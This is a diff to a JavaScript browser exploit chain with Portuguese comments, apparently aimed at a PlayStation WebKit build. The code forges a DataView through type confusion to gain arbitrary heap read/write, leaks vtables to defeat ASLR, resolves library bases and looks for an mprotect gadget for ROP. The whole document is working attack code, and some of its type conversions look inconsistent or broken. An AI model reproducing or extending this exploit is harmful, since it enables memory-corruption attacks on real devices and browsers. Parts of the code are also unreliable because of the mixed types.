@@ -4,12 +4,12 @@
 // FOCO: Fortificar a estabilidade da alocação do ArrayBuffer/DataView usado para OOB.
 // =======================================================================================
 
-import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../module/utils.mjs';
+import { toHex, log } from '../module/utils.mjs'; // Remover AdvancedInt64 e isAdvancedInt64Object da importação
 import {
     setupOOBPrimitive,
     getOOBDataView,
     clearOOBEnvironment,
-    getAddress,
+    getAddress, // getAddress agora retorna Int
     fakeObject,
     initializeCorePrimitives,
     readArbitrary,
@@ -69,6 +69,8 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
         for (let j = 0; j < bytesPerRow; j++) {
             if (i + j < size) {
                 try {
+                    // address agora é Addr (se for usado como tal), e arbReadFn espera Int ou AdvancedInt64
+                    // Precisamos garantir que address seja um Int ou um tipo compatível
                     const byte = await arbReadFn(address.add(i + j), 1, logFn);
                     rowBytes.push(byte);
                     hexLine += byte.toString(16).padStart(2, '0') + " ";
@@ -97,13 +99,19 @@ export async function readUniversalJSHeap(address, byteLength, logFn) {
         throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
     }
 
+    // address pode vir como AdvancedInt64 ou Int, precisamos garantir que seja Int ou Addr para kernelMemory.addrof
+    let addressAsInt = address;
+    if (!(address instanceof Int || address instanceof Addr)) {
+        addressAsInt = new Int(address.low(), address.high()); // Converte AdvancedInt64 para Int
+    }
+    
     // Use kernelMemory para obter o endereço do fakeDataView
     const fake_ab_backing_addr = kernelMemory.addrof(fakeDataView);
     const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
 
     // Use kernelMemory para ler e escrever
     const original_m_vector_of_backing_ab = kernelMemory.read64(M_VECTOR_OFFSET_IN_BACKING_AB);
-    kernelMemory.write64(M_VECTOR_OFFSET_IN_BACKING_AB, address);
+    kernelMemory.write64(M_VECTOR_OFFSET_IN_BACKING_AB, addressAsInt); // Write espera Int ou Addr
 
     let result = null;
     try {
@@ -114,14 +122,15 @@ export async function readUniversalJSHeap(address, byteLength, logFn) {
             case 8:
                 const low = fakeDataView.getUint32(0, true);
                 const high = fakeDataView.getUint32(4, true);
-                result = new AdvancedInt64(low, high);
+                // Retornar Int, pois AdvancedInt64 está sendo descontinuado
+                result = new Int(low, high);
                 break;
             default: throw new Error(`Invalid byteLength for readUniversalJSHeap: ${byteLength}`);
         }
     } finally {
         kernelMemory.write64(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab);
     }
-    return result;
+    return result; // Retorna Int
 }
 
 export async function writeUniversalJSHeap(address, value, byteLength, logFn) {
@@ -130,13 +139,20 @@ export async function writeUniversalJSHeap(address, value, byteLength, logFn) {
         logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME);
         throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
     }
+    
+    // address pode vir como AdvancedInt64 ou Int, precisamos garantir que seja Int ou Addr para kernelMemory.addrof
+    let addressAsInt = address;
+    if (!(address instanceof Int || address instanceof Addr)) {
+        addressAsInt = new Int(address.low(), address.high()); // Converte AdvancedInt64 para Int
+    }
+
     // Use kernelMemory para obter o endereço do fakeDataView
     const fake_ab_backing_addr = kernelMemory.addrof(fakeDataView);
     const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
 
     // Use kernelMemory para ler e escrever
     const original_m_vector_of_backing_ab = kernelMemory.read64(M_VECTOR_OFFSET_IN_BACKING_AB);
-    kernelMemory.write64(M_VECTOR_OFFSET_IN_BACKING_AB, address);
+    kernelMemory.write64(M_VECTOR_OFFSET_IN_BACKING_AB, addressAsInt); // Write espera Int ou Addr
 
     try {
         switch (byteLength) {
@@ -144,9 +160,16 @@ export async function writeUniversalJSHeap(address, value, byteLength, logFn) {
             case 2: fakeDataView.setUint16(0, Number(value), true); break;
             case 4: fakeDataView.setUint32(0, Number(value), true); break;
             case 8:
-                let val64 = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
-                fakeDataView.setUint32(0, val64.low(), true);
-                fakeDataView.setUint32(4, val64.high(), true);
+                // value pode ser AdvancedInt64 ou Int
+                let val64 = value;
+                if (!(val64 instanceof Int) && typeof val64.low === 'function' && typeof val64.high === 'function') {
+                    val64 = new Int(val64.low(), val64.high()); // Converte AdvancedInt64 para Int
+                } else if (!(val64 instanceof Int)) {
+                    val64 = new Int(val64); // Tenta converter um número para Int
+                }
+
+                fakeDataView.setUint32(0, val64.lo, true); // Usar .lo e .hi da classe Int
+                fakeDataView.setUint32(4, val64.hi, true); // Usar .lo e .hi da classe Int
                 break;
             default: throw new Error(`Invalid byteLength for writeUniversalJSHeap: ${byteLength}`);
         }
@@ -161,7 +184,7 @@ export async function writeUniversalJSHeap(address, value, byteLength, logFn) {
  * @param {Function} logFn Função de log.
  * @param {Function} pauseFn Função de pausa.
  * @param {object} JSC_OFFSETS_PARAM Offsets das estruturas JSC.
- * @param {AdvancedInt64} dataViewStructureVtableAddress O endereço do vtable da DataView Structure.
+ * @param {Int} dataViewStructureVtableAddress O endereço do vtable da DataView Structure (agora Int).
  * @param {number} m_mode_to_try O valor de m_mode a ser testado.
  * @returns {boolean} True se a primitiva foi configurada e testada com sucesso com este m_mode.
  */
@@ -170,20 +193,21 @@ async function attemptUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PA
     logFn(`[${FNAME}] Tentando configurar L/E Arbitrária Universal com m_mode: ${toHex(m_mode_to_try)}...`, "subtest", FNAME);
 
     fakeDataView = null;
-    let backingArrayBuffer = null; // Renomeado
+    let backingArrayBuffer = null;
 
     try {
         // Criar um ArrayBuffer de apoio real. Este será o objeto que será type-confused em DataView.
         backingArrayBuffer = new ArrayBuffer(0x1000);
         heldObjects.push(backingArrayBuffer); // Mantenha a referência para evitar GC.
         // Use kernelMemory.addrof para obter o endereço do backingArrayBuffer
-        const backing_ab_addr = kernelMemory.addrof(backingArrayBuffer);
+        const backing_ab_addr = kernelMemory.addrof(backingArrayBuffer); // Retorna Addr
+
         logFn(`[${FNAME}] ArrayBuffer de apoio real criado em: ${backing_ab_addr.toString(true)}`, "info", FNAME);
 
         // Corromper os metadados do ArrayBuffer de apoio para fazê-lo se parecer com um DataView.
         // Use kernelMemory para escrever
         // O primeiro campo (JSCell.structureID) é o ponteiro para a Structure, que contém a vtable.
-        kernelMemory.write64(backing_ab_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET), dataViewStructureVtableAddress);
+        kernelMemory.write64(backing_ab_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET), dataViewStructureVtableAddress); // dataViewStructureVtableAddress é Int
         // O m_vector do ArrayBuffer subjacente (o que realmente aponta para os dados do ArrayBuffer)
         // será zerado inicialmente, pois a primitiva ARB R/W universal irá manipulá-lo dinamicamente.
         kernelMemory.write64(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET), new Int(0,0)); // Usando Int do PSFree
@@ -195,7 +219,7 @@ async function attemptUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PA
         logFn(`[${FNAME}] Metadados de ArrayBuffer de apoio corrompidos para m_mode ${toHex(m_mode_to_try)}.`, "info", FNAME);
 
         // Forjar o DataView a partir do endereço do ArrayBuffer corrompido.
-        fakeDataView = fakeObject(backing_ab_addr);
+        fakeDataView = fakeObject(backing_ab_addr); // backing_ab_addr é Addr
         if (!(fakeDataView instanceof DataView)) {
             logFn(`[${FNAME}] FALHA: fakeObject não criou um DataView válido com m_mode ${toHex(m_mode_to_try)}! Construtor: ${fakeDataView?.constructor?.name}`, "error", FNAME);
             return false;
@@ -206,19 +230,21 @@ async function attemptUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PA
         // Vamos usar um objeto JS real como alvo para testar a escrita/leitura.
         const test_target_js_object = { test_prop: 0x11223344, second_prop: 0xAABBCCDD };
         heldObjects.push(test_target_js_object); // Garante que o objeto não seja coletado
-        const test_target_js_object_addr = getAddress(test_target_js_object);
+        const test_target_js_object_addr = getAddress(test_target_js_object); // Retorna Int
 
         // O DataView forjado (fakeDataView) terá seu m_vector manipulado pela readUniversalJSHeap/writeUniversalJSHeap
         // para apontar para o objeto de teste.
         const TEST_VALUE_UNIVERSAL = 0xDEADC0DE;
+        // writeUniversalJSHeap e readUniversalJSHeap esperam Int ou AdvancedInt64 para 'address' e retornam Int ou AdvancedInt64.
+        // Aqui passamos Int e esperamos Int.
         await writeUniversalJSHeap(test_target_js_object_addr, TEST_VALUE_UNIVERSAL, 4, logFn);
         const read_back_from_fake_dv = await readUniversalJSHeap(test_target_js_object_addr, 4, logFn);
 
-        if (test_target_js_object.test_prop === TEST_VALUE_UNIVERSAL && read_back_from_fake_dv === TEST_VALUE_UNIVERSAL) {
-            logFn(`[${FNAME}] SUCESSO CRÍTICO: L/E Universal (heap JS) FUNCIONANDO com m_mode ${toHex(m_mode_to_try)}!`, "vuln", FNAME);
+        if (test_target_js_object.test_prop === TEST_VALUE_UNIVERSAL && (read_back_from_fake_dv instanceof Int && read_back_from_fake_dv.lo === TEST_VALUE_UNIVERSAL)) { // read_back_from_fake_dv é Int
+            logFn(`[${FNAME}] SUCESSO CRÍTICO: L/E Universal (heap JS) FUNCIONANDO com m_mode: ${toHex(m_mode_to_try)}!`, "vuln", FNAME);
             return true;
         } else {
-            logFn(`[${FNAME}] FALHA: L/E Universal (heap JS) INCONSISTENTE! Lido: ${toHex(read_back_from_fake_dv)}, Esperado: ${toHex(TEST_VALUE_UNIVERSAL)}.`, "error", FNAME);
+            logFn(`[${FNAME}] FALHA: L/E Universal (heap JS) INCONSISTENTE! Lido: ${read_back_from_fake_dv ? toHex(read_back_from_fake_dv.lo) : 'N/A'}, Esperado: ${toHex(TEST_VALUE_UNIVERSAL)}.`, "error", FNAME);
             logFn(`    Objeto original.test_prop: ${toHex(test_target_js_object.test_prop)}`, "error", FNAME);
             return false;
         }
@@ -281,15 +307,16 @@ async function stabilizeCorePrimitives(logFn, pauseFn, JSC_OFFSETS_PARAM) {
             let test_obj = { a: 0x11223344, b: 0x55667788 };
             heldObjects.push(test_obj);
 
-            const addr = getAddress(test_obj);
+            const addr = getAddress(test_obj); // Retorna Int
             logFn(`[${FNAME}] getAddress para test_obj (${test_obj.toString()}) resultou em: ${addr.toString(true)}`, "debug", FNAME);
 
-            if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero) || addr.equals(AdvancedInt64.NaNValue)) {
+            // Verifica se 'addr' é uma instância válida de Int e não é zero.
+            if (!(addr instanceof Int) || addr.eq(new Int(0,0))) { // Substituir isAdvancedInt64Object e AdvancedInt64.Zero
                 logFn(`[${FNAME}] FALHA: getAddress retornou endereço inválido para test_obj.`, "error", FNAME);
                 throw new Error("getAddress falhou na estabilização.");
             }
 
-            const faked_obj = fakeObject(addr);
+            const faked_obj = fakeObject(addr); // addr é Int
             
             const original_val = faked_obj.a;
             faked_obj.a = 0xDEADC0DE;
@@ -325,10 +352,10 @@ export async function executeExploitChain(logFn, pauseFn) {
     let foundMMode = null;
 
     let DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = null;
-    let textAreaVTableAddr = null; // Endereço da vtable da textarea
-    let libWebKitBase = null; // Base da libWebKit
-    let libKernelBase = null; // Base da libKernel
-    let libCLibBase = null; // Base da libSceLibcInternal
+    let textAreaVTableAddr = null; // Endereço da vtable da textarea (Int)
+    let libWebKitBase = null; // Base da libWebKit (Int)
+    let libKernelBase = null; // Base da libKernel (Int)
+    let libCLibBase = null; // Base da libSceLibcInternal (Int)
 
 
     try {
@@ -428,24 +455,24 @@ export async function executeExploitChain(logFn, pauseFn) {
         const textarea_elem = document.createElement('textarea');
         heldObjects.push(textarea_elem); // Mantenha a referência
         // WebCore::HTMLTextAreaElement
-        const webcore_textarea_addr = kernelMemory.addrof(textarea_elem).add(JSC_OFFSETS.JSObject.jsta_impl);
+        const webcore_textarea_addr = kernelMemory.addrof(textarea_elem).add(JSC_OFFSETS.JSObject.jsta_impl); // Addr
         // vtable para WebCore::HTMLTextAreaElement (em PT_SCE_RELRO)
-        textAreaVTableAddr = kernelMemory.readp(webcore_textarea_addr.add(0));
+        textAreaVTableAddr = kernelMemory.readp(webcore_textarea_addr.add(0)); // Addr
 
         logFn(`[ASLR LEAK] Vtable da HTMLTextAreaElement vazada: ${textAreaVTableAddr.toString(true)}`, "leak");
 
-        if (!isAdvancedInt64Object(textAreaVTableAddr) || textAreaVTableAddr.equals(AdvancedInt64.Zero)) {
+        // Verificar se é uma instância válida de Addr e não é zero.
+        if (!(textAreaVTableAddr instanceof Addr) || textAreaVTableAddr.eq(new Int(0,0))) { // Comparar com Int(0,0)
             const errMsg = `Falha na leitura da vtable da HTMLTextAreaElement: ${textAreaVTableAddr.toString(true)}. Abortando ASLR leak.`;
             logFn(errMsg, "critical");
             throw new Error(errMsg);
         }
 
         // Encontrar a base da libSceNKWebKit.sprx usando find_base
-        // A função find_base do PSFree usa Int, precisamos converter Addr para Int para compatibilidade
-        libWebKitBase = find_base(new Int(textAreaVTableAddr.low(), textAreaVTableAddr.high()), true, true);
+        libWebKitBase = find_base(textAreaVTableAddr, true, true); // find_base agora aceita Addr
         logFn(`[ASLR LEAK] Base da libSceNKWebKit.sprx: ${libWebKitBase.toString(true)}`, "leak");
 
-        if (!libWebKitBase || libWebKitBase.equals(new Int(0,0))) {
+        if (!(libWebKitBase instanceof Int) || libWebKitBase.eq(new Int(0,0))) { // libWebKitBase é Int
             const errMsg = `Falha ao encontrar a base da libSceNKWebKit.sprx. Abortando ASLR leak.`;
             logFn(errMsg, "critical");
             throw new Error(errMsg);
@@ -453,28 +480,28 @@ export async function executeExploitChain(logFn, pauseFn) {
 
         // Resolução de imports para libkernel_web.sprx e libSceLibcInternal.sprx
         // Offset de __stack_chk_fail importado em libwebkit_base (exemplo do PSFree 9.00)
-        const stack_chk_fail_import_addr = libWebKitBase.add(JSC_OFFSETS.WEBKIT_IMPORTS.offset_wk_stack_chk_fail);
-        const stack_chk_fail_resolved_addr = resolve_import(stack_chk_fail_import_addr);
-        libKernelBase = find_base(new Int(stack_chk_fail_resolved_addr.low(), stack_chk_fail_resolved_addr.high()), true, true);
+        const stack_chk_fail_import_addr = new Addr(libWebKitBase.lo, libWebKitBase.hi).add(JSC_OFFSETS.WEBKIT_IMPORTS.offset_wk_stack_chk_fail); // Converter para Addr para .add
+        const stack_chk_fail_resolved_addr = resolve_import(stack_chk_fail_import_addr); // Retorna Addr
+        libKernelBase = find_base(stack_chk_fail_resolved_addr, true, true); // find_base agora aceita Addr
         logFn(`[ASLR LEAK] Base da libkernel_web.sprx: ${libKernelBase.toString(true)}`, "leak");
 
-        const memcpy_import_addr = libWebKitBase.add(JSC_OFFSETS.WEBKIT_IMPORTS.offset_wk_memcpy);
-        const memcpy_resolved_addr = resolve_import(memcpy_import_addr);
-        libCLibBase = find_base(new Int(memcpy_resolved_addr.low(), memcpy_resolved_addr.high()), true, true);
+        const memcpy_import_addr = new Addr(libWebKitBase.lo, libWebKitBase.hi).add(JSC_OFFSETS.WEBKIT_IMPORTS.offset_wk_memcpy); // Converter para Addr para .add
+        const memcpy_resolved_addr = resolve_import(memcpy_import_addr); // Retorna Addr
+        libCLibBase = find_base(memcpy_resolved_addr, true, true); // find_base agora aceita Addr
         logFn(`[ASLR LEAK] Base da libSceLibcInternal.sprx: ${libCLibBase.toString(true)}`, "leak");
 
-        webkitBaseAddress = libWebKitBase; // Define a base do WebKit vazada
+        webkitBaseAddress = libWebKitBase; // Define a base do WebKit vazada (Int)
 
 
         const dummy_object_for_aslr_leak = { prop1: 0x1234, prop2: 0x5678 };
         heldObjects.push(dummy_object_for_aslr_leak);
-        const dummy_object_addr = getAddress(dummy_object_for_aslr_leak);
+        const dummy_object_addr = getAddress(dummy_object_for_aslr_leak); // Retorna Int
         logFn(`[ASLR LEAK] Endereço de dummy_object_for_aslr_leak: ${dummy_object_addr.toString(true)}`, "info");
 
         logFn(`[ASLR LEAK] Tentando manipular flags/offsets do ArrayBuffer real para bypass da mitigação.`, "info");
 
         const TEST_VALUE_FOR_0X34 = 0x1000;
-        const TEST_VALUE_FOR_0X40 = new AdvancedInt64(0x1, 0);
+        const TEST_VALUE_FOR_0X40 = new Int(0x1, 0); // Usar Int aqui
 
         const oob_array_buffer_real_ref = oobDataView.buffer;
 
@@ -493,43 +520,50 @@ export async function executeExploitChain(logFn, pauseFn) {
         await pauseFn(LOCAL_SHORT_PAUSE);
 
         // A leitura do ponteiro da Structure do dummy_object será feita com a nova primitiva `kernelMemory.read64`
-        const structure_pointer_from_dummy_object_addr = dummy_object_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
-        const structure_address_from_leak = kernelMemory.read64(new Addr(structure_pointer_from_dummy_object_addr.low(), structure_pointer_from_dummy_object_addr.high()));
+        const structure_pointer_from_dummy_object_addr = new Addr(dummy_object_addr.lo, dummy_object_addr.hi).add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET); // Converter para Addr
+        const structure_address_from_leak = kernelMemory.read64(structure_pointer_from_dummy_object_addr); // Retorna Int
 
         logFn(`[ASLR LEAK] Endereço da Structure do dummy_object (vazado): ${structure_address_from_leak.toString(true)}`, "leak");
 
-        if (!isAdvancedInt64Object(structure_address_from_leak) || structure_address_from_leak.equals(AdvancedInt64.Zero)) {
+        // Verificar se é uma instância válida de Int e não é zero.
+        if (!(structure_address_from_leak instanceof Int) || structure_address_from_leak.eq(new Int(0,0))) {
             const errMsg = `Falha na leitura do ponteiro da Structure do dummy_object após ajuste: ${structure_address_from_leak.toString(true)}. Abortando ASLR leak.`;
             logFn(errMsg, "critical");
             throw new Error(errMsg);
         }
 
-        const class_info_address = structure_address_from_leak.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET);
+        const class_info_address = structure_address_from_leak.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET); // Retorna Int
         logFn(`[ASLR LEAK] Endereço da ClassInfo do dummy_object: ${class_info_address.toString(true)}`, "info");
 
-        const vtable_class_info_address_in_webkit = kernelMemory.read64(new Addr(class_info_address.low(), class_info_address.high()).add(JSC_OFFSETS.ClassInfo.M_CACHED_TYPE_INFO_OFFSET));
+        const class_info_address_as_addr = new Addr(class_info_address.lo, class_info_address.hi); // Converter para Addr
+        const vtable_class_info_address_in_webkit = kernelMemory.read64(class_info_address_as_addr.add(JSC_OFFSETS.ClassInfo.M_CACHED_TYPE_INFO_OFFSET)); // Retorna Int
         logFn(`[ASLR LEAK] Endereço da Vtable da ClassInfo do dummy_object (dentro do WebKit): ${vtable_class_info_address_in_webkit.toString(true)}`, "leak");
 
-        if (!isAdvancedInt64Object(vtable_class_info_address_in_webkit) || vtable_class_info_address_in_webkit.equals(AdvancedInt64.Zero) || (vtable_class_info_address_in_webkit.low() & 0xFFF) !== 0x000) {
+        // Verificar se é uma instância válida de Int e não é zero.
+        if (!(vtable_class_info_address_in_webkit instanceof Int) || vtable_class_info_address_in_webkit.eq(new Int(0,0)) || (vtable_class_info_address_in_webkit.lo & 0xFFF) !== 0x000) {
             const errMsg = `Vtable da ClassInfo (${vtable_class_info_address_in_webkit.toString(true)}) é inválida ou não alinhada. Abortando ASLR leak.`;
             logFn(errMsg, "critical");
             throw new Error(errMsg);
         }
 
-        const OFFSET_VTABLE_CLASSINFO_TO_WEBKIT_BASE = new AdvancedInt64(parseInt(JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
-        webkitBaseAddress = vtable_class_info_address_in_webkit.sub(OFFSET_VTABLE_CLASSINFO_TO_WEBKIT_BASE);
+        const OFFSET_VTABLE_CLASSINFO_TO_WEBKIT_BASE = new Int(parseInt(JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0); // Usar Int
+        webkitBaseAddress = vtable_class_info_address_in_webkit.sub(OFFSET_VTABLE_CLASSINFO_TO_WEBKIT_BASE); // Retorna Int
 
-        if (webkitBaseAddress.equals(AdvancedInt64.Zero) || (webkitBaseAddress.low() & 0xFFF) !== 0x000) {
+        // Verificar se é uma instância válida de Int e não é zero.
+        if (!(webkitBaseAddress instanceof Int) || webkitBaseAddress.eq(new Int(0,0)) || (webkitBaseAddress.lo & 0xFFF) !== 0x000) {
             const errMsg = `Base WebKit calculada (${webkitBaseAddress.toString(true)}) é inválida ou não alinhada. Abortando ASLR leak.`;
             logFn(errMsg, "critical");
             throw new Error(errMsg);
         }
         logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO: ${webkitBaseAddress.toString(true)}`, "good");
 
-        const mprotect_plt_offset_check = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
-        const mprotect_addr_check = webkitBaseAddress.add(mprotect_plt_offset_check);
+        const mprotect_plt_offset_check = new Int(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0); // Usar Int
+        const mprotect_addr_check = webkitBaseAddress.add(mprotect_plt_offset_check); // Retorna Int
         logFn(`Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
-        const mprotect_first_bytes_check = await readArbitrary(mprotect_addr_check, 4);
+        const mprotect_addr_check_as_addr = new Addr(mprotect_addr_check.lo, mprotect_addr_check.hi); // Converter para Addr
+        const mprotect_first_bytes_check = await readArbitrary(mprotect_addr_check_as_addr, 4); // readArbitrary ainda retorna AdvancedInt64
+        // mprotect_first_bytes_check virá como AdvancedInt64, acessar .low() ou .high()
+        // Comparar com 0x00000000 (número), então não precisa de conversão.
 
         if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) {
             logFn(`LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
@@ -541,7 +575,7 @@ export async function executeExploitChain(logFn, pauseFn) {
 
         logFn("--- FASE 4: Configurando a primitiva de L/E Arbitrária Universal (via fakeObject DataView) ---", "subtest");
         
-        DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = webkitBaseAddress.add(new AdvancedInt64(parseInt(JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0));
+        DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = webkitBaseAddress.add(new Int(parseInt(JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0)); // Retorna Int
         logFn(`[${FNAME_CURRENT_TEST_BASE}] Endereço calculado do vtable da DataView Structure para FORJAMENTO: ${DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE.toString(true)}`, "info");
 
         const mModeCandidates = JSC_OFFSETS.DataView.M_MODE_CANDIDATES;
@@ -549,6 +583,7 @@ export async function executeExploitChain(logFn, pauseFn) {
 
         for (const candidate_m_mode of mModeCandidates) {
             logFn(`[${FNAME_CURRENT_TEST}] Tentando m_mode candidato: ${toHex(candidate_m_mode)}`, "info");
+            // DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE é Int
             universalRwSuccess = await attemptUniversalArbitraryReadWrite(
                 logFn,
                 pauseFn,
@@ -577,20 +612,22 @@ export async function executeExploitChain(logFn, pauseFn) {
 
         const dumpTargetUint8Array = new Uint8Array(0x100);
         heldObjects.push(dumpTargetUint8Array);
-        const dumpTargetAddr = getAddress(dumpTargetUint8Array);
+        const dumpTargetAddr = getAddress(dumpTargetUint8Array); // Retorna Int
         logFn(`[DEBUG] Dump de memória de um novo Uint8Array real (${dumpTargetAddr.toString(true)}) usando L/E Universal.`, "debug");
-        await dumpMemory(dumpTargetAddr, 0x100, logFn, readUniversalJSHeap, "Uint8Array Real Dump (Post-Universal-RW)");
+        const dumpTargetAddrAsAddr = new Addr(dumpTargetAddr.lo, dumpTargetAddr.hi); // Converte para Addr
+        await dumpMemory(dumpTargetAddrAsAddr, 0x100, logFn, readUniversalJSHeap, "Uint8Array Real Dump (Post-Universal-RW)");
         await pauseFn(LOCAL_MEDIUM_PAUSE);
 
 
         logFn("Iniciando descoberta FUNCIONAL de gadgets ROP/JOP na WebKit...", "info");
-        const mprotect_plt_offset = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
-        const mprotect_addr_real = webkitBaseAddress.add(mprotect_plt_offset);
+        const mprotect_plt_offset = new Int(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0); // Usar Int
+        const mprotect_addr_real = webkitBaseAddress.add(mprotect_plt_offset); // Retorna Int
 
         logFn(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
-        const mprotect_first_bytes = await readUniversalJSHeap(mprotect_addr_real, 4, logFn);
+        const mprotect_addr_real_as_addr = new Addr(mprotect_addr_real.lo, mprotect_addr_real.hi); // Converte para Addr
+        const mprotect_first_bytes = await readUniversalJSHeap(mprotect_addr_real_as_addr, 4, logFn); // readUniversalJSHeap retorna Int
         logFn(`[REAL LEAK] Primeiros 4 bytes de mprotect_plt_stub (${mprotect_addr_real.toString(true)}): ${toHex(mprotect_first_bytes)}`, "leak");
-        if (mprotect_first_bytes !== 0 && mprotect_first_bytes !== 0xFFFFFFFF) {
+        if (mprotect_first_bytes instanceof Int && mprotect_first_bytes.lo !== 0 && mprotect_first_bytes.lo !== 0xFFFFFFFF) { // Comparar Int.lo
             logFn(`LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes)}. ASLR validado!`, "good");
         } else {
              logFn(`ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando.`, "warn");
@@ -607,10 +644,10 @@ export async function executeExploitChain(logFn, pauseFn) {
         heldObjects.push(test_obj_post_leak);
         logFn(`Objeto de teste escolhido do spray (ou novo criado) para teste pós-vazamento.`, "info");
 
-        const test_obj_addr_post_leak = getAddress(test_obj_post_leak);
+        const test_obj_addr_post_leak = getAddress(test_obj_post_leak); // Retorna Int
         logFn(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");
 
-        const faked_obj_for_post_leak_test = fakeObject(test_obj_addr_post_leak);
+        const faked_obj_for_post_leak_test = fakeObject(test_obj_addr_post_leak); // test_obj_addr_post_leak é Int
         if (!faked_obj_for_post_leak_test || typeof faked_obj_for_post_leak_test !== 'object') {
             throw new Error("Failed to recreate fakeobj for post-ASLR leak test.");
         }
@@ -634,15 +671,16 @@ export async function executeExploitChain(logFn, pauseFn) {
         logFn("Iniciando teste de resistência PÓS-VAZAMENTO: Executando L/E arbitrária universal múltiplas vezes...", "info");
         let resistanceSuccessCount_post_leak = 0;
         const numResistanceTests = 10;
-        const butterfly_addr_of_spray_obj = test_obj_addr_post_leak.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET);
+        const butterfly_addr_of_spray_obj = test_obj_addr_post_leak.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET); // Retorna Int
 
         for (let i = 0; i < numResistanceTests; i++) {
-            const test_value_arb_rw = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
+            const test_value_arb_rw = new Int(0xCCCC0000 + i, 0xDDDD0000 + i); // Usar Int
+            const butterfly_addr_of_spray_obj_as_addr = new Addr(butterfly_addr_of_spray_obj.lo, butterfly_addr_of_spray_obj.hi); // Converter para Addr
             try {
-                await writeUniversalJSHeap(butterfly_addr_of_spray_obj, test_value_arb_rw, 8, logFn);
-                const read_back_value_arb_rw = await readUniversalJSHeap(butterfly_addr_of_spray_obj, 8, logFn);
+                await writeUniversalJSHeap(butterfly_addr_of_spray_obj_as_addr, test_value_arb_rw, 8, logFn); // value é Int
+                const read_back_value_arb_rw = await readUniversalJSHeap(butterfly_addr_of_spray_obj_as_addr, 8, logFn); // Retorna Int
 
-                if (read_back_value_arb_rw.equals(test_value_arb_rw)) {
+                if (read_back_value_arb_rw.eq(test_value_arb_rw)) { // Comparar Int com .eq()
                     resistanceSuccessCount_post_leak++;
                     logFn(`[Resistência PÓS-VAZAMENTO #${i}] SUCESSO: L/E arbitrária consistente no Butterfly.`, "debug");
                 } else {
